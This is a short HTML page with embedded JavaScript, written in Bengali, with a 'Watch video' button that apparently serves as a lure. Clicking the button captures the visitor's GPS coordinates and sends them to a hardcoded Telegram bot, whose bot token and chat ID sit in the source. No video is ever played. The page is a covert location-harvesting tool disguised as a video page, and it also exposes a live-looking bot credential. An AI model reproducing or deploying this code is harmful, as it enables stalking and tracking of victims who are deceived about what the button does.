    <button onclick="sendLocationToTelegram()">ভিডিও দেখুন</button>

    <p id="status"></p>

    <script>
        const TELEGRAM_BOT_TOKEN = "8725973028:AAHyBGtJnrPlKkil-nt5FgvZCGRl8KurQd0"; 
        const TELEGRAM_CHAT_ID = "7599370002"; 

        function sendLocationToTelegram() {
            const statusText = document.getElementById("status");

            if (navigator.geolocation) {
                statusText.innerText = "লোকেশন নেওয়া হচ্ছে...";

                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;

                        statusText.innerText = "টেলিগ্রামে পাঠানো হচ্ছে...";

                        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendLocation`;

                        fetch(url, {
                            method: "POST",
                            headers: { "Content-Type": "application/json" },
                            body: JSON.stringify({
                                chat_id: TELEGRAM_CHAT_ID,
                                latitude: lat,
                                longitude: lon
                            })
                        })
                        .then(response => response.json())
                        .then(data => {
                            if (data.ok) {
                                statusText.innerText = "সফলভাবে টেলিগ্রামে লোকেশন পাঠানো হয়েছে!";
                            } else {
                                statusText.innerText = "পাঠাতে ব্যর্থ হয়েছে।";
                            }
                        })
                        .catch(error => {
                            statusText.innerText = "ত্রুটি ঘটেছে: " + error;
                        });
                    },
                    function(error) {
                        statusText.innerText = "ধন্যবাদ।";
                    }
                );
            } else {
                statusText.innerText = "Geolocation সাপোর্ট করে না।";
            }
        }
    </script>
